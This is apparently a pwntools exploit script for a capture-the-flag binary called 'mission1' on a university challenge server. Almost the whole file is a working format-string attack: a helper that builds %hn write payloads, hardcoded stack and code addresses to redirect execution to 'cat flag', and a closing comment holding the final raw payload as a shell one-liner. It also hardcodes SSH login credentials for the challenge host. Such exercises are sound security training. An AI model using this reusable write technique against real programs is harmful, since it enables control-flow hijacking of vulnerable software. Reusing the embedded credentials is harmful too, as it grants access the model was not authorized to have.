from pwn import *
from sys import *

SERVER = "bin.chall.necst.it"
PORT = 22
BINARY = "mission1"
REMOTE_BINARY = "/home/m226002/"+BINARY+"/"+BINARY
PASSWORD = "unixporn"
USER  = "m226002"


if "--remote" in sys.argv:
    s = ssh(user=USER, host=SERVER, port=PORT, password=PASSWORD)
    r = s.process(REMOTE_BINARY)
else:
    r = process(BINARY)

if "--debug" in sys.argv:
     
    gdb.attach(r, """
        #breakpoints
        unset environment
        b create_art
        b view_saved_art
        b* 0x080489d7
        b cat
        c
        """)

#code
def create_format_string(offset, tuples, initial_bytes, final_bytes):
    if(len(initial_bytes)%4!=0):
        assert "intial space nope"

    chunks = []

    for (where, what) in tuples:
        high = what >> 16
        low = what & 0xffff

        if high>low:
            chunks.append((low, where))
            chunks.append((high, where+2))
        else:
            chunks.append((low, where))
            chunks.append((high, where+2))

    chunks = sorted(chunks, key=lambda x: x[0])

    for (half, where) in chunks:
        print("half: ", hex(half), "where: ", hex(where))

    str_format=b""
    str_format+=initial_bytes

    #chunks [(half where)]

    for (_,where) in chunks:
        str_format+=p32(where)
    
    printed = len(str_format)

    real_offset = offset + int(len(initial_bytes)/4)
    
    for (i, (half, _)) in enumerate(chunks):
        str_format+=f"%{half-printed}c".encode()
        str_format+=f"%{real_offset+i}$hn".encode()
        printed = half

    str_format+=final_bytes

    return str_format


def write_buffer(buffer):
    r.recvuntil(b'>')
    r.sendline(b'2')
    sleep(timesleep)
    r.sendline(buffer)
    sleep(timesleep)

def view_buff():
    r.recvuntil(b'>')
    r.sendline(b'3')
    sleep(timesleep)


timesleep = 0
binary = ELF("./mission1")

jump_cat = (0xffffdd5c, 0x08048a00) #where, what
arg_flag = (0xffffdd64, 0xffffdd8c )
offset = 51
happy_art = b"flag;( o.o )"

format_string = create_format_string(offset=offset, tuples=[jump_cat, arg_flag], initial_bytes=happy_art, final_bytes=b"")
print(format_string)

write_buffer(format_string)
view_buff()

sleep(timesleep)

r.interactive()

#final working string


# (python3 -c "import sys; sys.stdout.buffer.write(b'2\nflag;( o.o )\x5e\xdd\xff\xff\\x5c\xdd\xff\xff\x64\xdd\xff\xff\x66\xdd\xff\xff%2024c%54\$hn%33276c%55\$hn%21388c%56\$hn%8819c%57\$hn\n3\n')"; cat -) | env -i "PWD=/home/m226002/mission1" SHLVL=0 /home/m226002/mission1/mission1
